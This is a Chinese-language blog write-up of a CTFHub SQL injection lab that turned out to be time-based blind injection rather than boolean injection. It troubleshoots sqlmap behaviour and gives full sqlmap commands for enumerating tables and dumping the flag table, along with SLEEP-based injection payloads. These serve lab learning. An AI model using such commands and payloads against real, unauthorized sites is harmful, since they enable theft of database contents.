---
title: "CTFHub 踩坑记：当"布尔注入"遇上 Time-based Blind SQL 注入"
date: 2026-06-03T21:30:00+08:00
draft: false
tags: ["CTF", "Web安全", "SQL注入", "sqlmap", "Time-based Blind"]
categories: ["技术笔记"]
---

## 前言

最近在刷 CTFHub 的 SQL 注入系列，做到一个分类为**"布尔注入"**的题目，结果用 sqlmap 跑的时候直接"卡住"了。排查了一圈才发现，这个题目实际上的注入类型是 **Time-based Blind（时间盲注）**，而不是布尔盲注。虽然最终拿到了 flag，但整个过程踩了不少坑，记录一下供大家参考。

---

## 题目信息

- **平台**：CTFHub
- **题目分类**：布尔注入
- **目标 URL**：`http://challenge-6e6c191bf8163cef.sandbox.ctfhub.com:10800/?id=1`
- **后端**：MySQL >= 5.0.12 (MariaDB fork)

---

## 现象：sqlmap "卡住"了

一开始直接用 sqlmap 跑：

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --tables
```

结果 sqlmap 跑到一半就不动了，屏幕上一直显示：

```
.............................. (done)
```

等了很久也没输出表名。第一反应是网络问题或者 sqlmap 挂了，但实际上它是**正在工作**，只是慢得让人以为卡住了。

---

## 原因分析：Time-based Blind 注入

后来加上 `--batch` 参数让它自动运行，才发现真相：

```
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=2766 AND (SELECT 4051 FROM (SELECT(SLEEP(5)))PyfQ)
```

**原来这个题目的实际注入类型是 Time-based Blind，每次查询都要执行 `SLEEP(5)`。**

这意味着 sqlmap 每猜一个字符，都要等待至少 5 秒钟。枚举表名可能需要发几十上百个请求，dump 数据时甚至可能要等几十分钟。屏幕上那些 `.......` 不是卡住了，而是 sqlmap 在收集统计基线，用于判断"这次请求是否延迟了"。

---

## 踩坑一：没加 `--batch`，sqlmap 停下来等输入

Time-based blind 模式下，sqlmap 会弹出一个交互式提问：

```
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
```

如果不加 `--batch`，sqlmap 就会停在这里等你回答 `Y` 或 `n`。很多人（包括我）以为这是"卡住了"，实际上只是 sqlmap 在等用户输入。

**正确做法**：始终加上 `--batch`，让 sqlmap 自动选择默认值。

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --batch --tables
```

---

## 踩坑二：题目叫"布尔注入"，但实际是时间盲注

因为 CTFHub 把这个题归类为"布尔注入"，我首先尝试用 `--technique=B` 强制只检测布尔盲注：

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --batch --technique=B --level=3 --tables
```

结果 sqlmap 跑了一大圈，最终输出：

```
[ERROR] all tested parameters do not appear to be injectable.
```

**布尔盲注没检测到。** 这说明要么这个题目的页面回显差异非常微妙，sqlmap 无法识别；要么题目分类名和实际环境不匹配。无论如何，sqlmap 最终只能识别出 time-based blind 注入点。

---

## 踩坑三：错误设置 `--time-sec`

在优化提示时，我一度尝试把 `--time-sec` 设成 `0.1`，想让它跑快一点：

```bash
# 错误！不要在 Y/n 提示里输入数字
# 而且 0.1 秒对于 time-based blind 来说太小了
```

结果不仅没用，还导致：

```
[CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
```

**原因**：`--time-sec` 设得太小，正常的网络波动都可能超过 0.1 秒，sqlmap 根本无法区分"正常响应"和"注入延迟"，导致大量误判和重试。

**正确做法**：
- `Y/n` 问题只回答 `Y` 或 `n`
- 如果要手动设置延迟，用参数形式：`--time-sec=3`
- 建议值至少为 3-5 秒

---

## 正确的 sqlmap 命令

对于这个 time-based blind 注入的靶场，正确的打开方式是：

### 1. 枚举表名

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --batch \
  --technique=T \
  --time-sec=3 \
  --threads=10 \
  --tables
```

### 2. 直接 dump flag（假设表名 flag，列名 flag）

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --batch \
  --technique=T \
  --time-sec=3 \
  --threads=10 \
  -T flag -C flag --dump
```

### 关键参数说明

| 参数 | 作用 |
|------|------|
| `--batch` | 自动回答所有交互式提问，不会中途停下来 |
| `--technique=T` | 强制使用 Time-based blind 技术 |
| `--time-sec=3` | 设置延迟时间为 3 秒（默认 5 秒） |
| `--threads=10` | 多线程并发，略微加速 |
| `--flush-session` | 清空之前的 session，重新检测 |

---

## Time-based Blind 为什么慢？

Time-based blind 注入的核心逻辑是：

```sql
-- 如果第一个字符是 'c'，延迟 5 秒
id=1 AND IF(SUBSTRING((SELECT flag FROM flag),1,1)='c', SLEEP(5), 0)
```

sqlmap 需要**逐个字符、逐位猜解**，每次请求都要等 `SLEEP()` 执行完。一个 30 个字符的 flag，如果每个字符平均试 40 次（二分查找优化后），总共要发 1200 个请求，每个等 3-5 秒，**总时间约为 1-2 小时**。

这也是为什么它会"一个字母一个字母地蹦"出来：

```
ctfhub{2c...
```

---

## sqlmap 的 session 恢复机制

sqlmap 会把检测到的注入点保存到 session 文件中（通常在 `~/.local/share/sqlmap/output/`）。下次运行时，它会直接恢复 session，不再重新检测。

这也导致了一个问题：**如果 session 里已经存了 time-based blind，即使你想测其他注入类型，sqlmap 也会优先用 session 里的结果。**

如果要重新检测，必须加 `--flush-session`：

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --flush-session --batch --tables
```

---

## 总结

| 问题 | 原因 | 解决方案 |
|------|------|---------|
| sqlmap "卡住"不动 | Time-based blind 每个请求要等 SLEEP(5) | 耐心等，或者加 `--threads=10` |
| 中途停下来问 Y/n | 没加 `--batch` | 始终加 `--batch` |
| 布尔盲注检测不到 | 实际只有 time-based blind | 用 `--technique=T` |
| 设置了错误的 time-sec | 在 Y/n 提示里输入了数字，或值太小 | 用 `--time-sec=3`，只在参数里设 |
| 想换注入类型但没用 | session 里存了旧结果 | 加 `--flush-session` |

---

## 经验教训

1. **CTFHub 的题目分类不一定准确**，实际环境配置可能和分类名不一致。
2. **sqlmap 的 `--batch` 参数很重要**，不加它会在交互提问处停下来。
3. **Time-based blind 就是慢**，这不是 bug，是它的工作方式。如果题目支持报错注入或 UNION 注入，会快几十倍。
4. **session 文件会记住之前的检测结果**，想重新扫描要 `--flush-session`。
5. **不要随手改 `--time-sec` 为很小的值**，网络波动会毁掉所有判断。

这个题目虽然分类叫"布尔注入"，但最终是靠 time-based blind 拿下的 flag。sqlmap 是个强大的工具，但了解它的工作原理和各种参数的含义，才能真正用好它。
